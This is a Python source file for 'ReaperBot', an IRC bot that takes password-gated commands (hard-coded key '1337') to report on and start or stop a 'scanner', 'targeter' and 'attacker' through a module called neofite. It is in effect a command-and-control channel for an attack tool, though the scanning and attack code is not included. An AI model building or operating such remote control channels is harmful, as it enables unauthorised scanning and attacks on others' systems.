__author__ = 'parallax'

import sys
from twisted.words.protocols import irc
from twisted.internet import protocol, reactor
import neofite
import config
import Logger


class ReaperBot(irc.IRCClient):
    def __init__(self, config):
        self.config = config
        self.channel = None
        self.command = None
        self.auth_key = "1337"
        self.authenticated = False
        self.master = ""
        self.neofite = neofite.neofite(config)

    def _get_nickname(self):
        return self.config.get_handle()

    nickname = property(_get_nickname)

    def signedOn(self):
        self.join(self.config.get_channel())
        print "Signed on as %s." % (self.nickname,)

    def joined(self, channel):
        print "Joined %s." % (channel,)

    def privmsg(self, user, channel, msg):
        # Set the global properies for easy reference later on
        self.user = user
        self.channel = channel
        self.command = msg.split(" ", 1)

        # Received message from something else than a user? Do nothing
        if not user:
            return

        # Start looking for an auth command. It's the only command that is handled without authentication
        if self.command[0] == "auth":
            self.handle_auth()
            return

        # Any commands after this line require an authenticated master
        if not self.authenticated or user != self.master:
            return

        if self.command[0] == "help":
            self.display_help()
            return

        if self.command[0] == "status":
            self.display_status()
            return

        if self.command[0] == "start":
            self.start()
            return

        if self.command[0] == "stop":
            self.stop()
            return

    # Handles the authentication of a user.
    # Only one user can be authenticated, and is therefor able to issue commands
    def handle_auth(self):
        operand = self.command[1]
        if operand == self.auth_key:
            self.authenticated = True
            self.master = self.user
            print self.user + " is now master"
            self.msg(self.channel, "ack")
        return

    def display_help(self):
        self.msg(self.channel, "The following commands are possible:")
        self.msg(self.channel, "status   | Displays the status of the scanner, targeter and attacker")
        self.msg(self.channel, "start <service>   | Starts <service> where <service> is [scanner]")
        self.msg(self.channel, "stop <service>    | Stops <service> where <service> is [scanner]")

        return

    def display_status(self):
        # Do we have an operand?
        if len(self.command) == 2:
            display_list = {"scanner": False, "targeter": False, "attacker": False}
            if self.command[1] == "scanner":
                display_list["scanner"] = True
            elif self.command[1] == "targeter":
                display_list["targeter"] = True
            elif self.command[1] == "attacker":
                display_list["attacker"] =  True
            else:
                display_list = {"scanner": True, "targeter": True, "attacker": True}
        else:
            display_list = {"scanner": True, "targeter": True, "attacker": True}

        # Now that we have determined what to display, go ahead
        if display_list["scanner"]:
            scanner_status = self.neofite.is_scanner_running()
            self.msg(self.channel, "[+] scanner    : %s" % ("up" if scanner_status else "down"))
        if display_list["targeter"]:
            targeter_status = False
            self.msg(self.channel, "[+] targeter   : %s" % ("up" if targeter_status else "down"))
        if display_list["attacker"]:
            attacker_status = False
            self.msg(self.channel, "[+] attacker   : %s" % ("up" if attacker_status else "down"))
        return

    def start(self):
        if len(self.command) != 2:
            self.msg(self.channel, "[!] missing operand [scanner")
            return

        if self.command[1] == "scanner":
            if not self.neofite.start_scanner():
                self.msg(self.channel, "[!] scanner already started")
            else:
                self.msg(self.channel, "[+] scanner started")
            return

    def stop(self):
        if len(self.command) != 2:
            self.msg(self.channel, "[!] missing operand [scanner]")
            return

        if self.command[1] == "scanner":
            if not self.neofite.is_scanner_running():
                self.msg(self.channel, "[!] scanner is already stopped")
            else:
                self.neofite.stop_scanner()
                self.msg(self.channel, "[+] scanner stopped")
            return

class BotFactory(protocol.ClientFactory):
    def __init__(self, config):
        self.config = config

    def buildProtocol(self, addr):
        p = ReaperBot(self.config)
        p.factory = self
        return p

    def clientConnectionLost(self, connector, reason):
        print "Lost connection (%s), reconnecting." % (reason,)
        connector.connect()

    def clientConnectionFailed(self, connector, reason):
        print "Could not connect: %s" % (reason,)

logger = Logger.Logger()
config = config.Config("/etc/reaperbot/config", Logger)

if __name__ == "__main__":
    chan = sys.argv[1]
    reactor.connectTCP(config.get_host(), config.get_port(), BotFactory(config))
    reactor.run()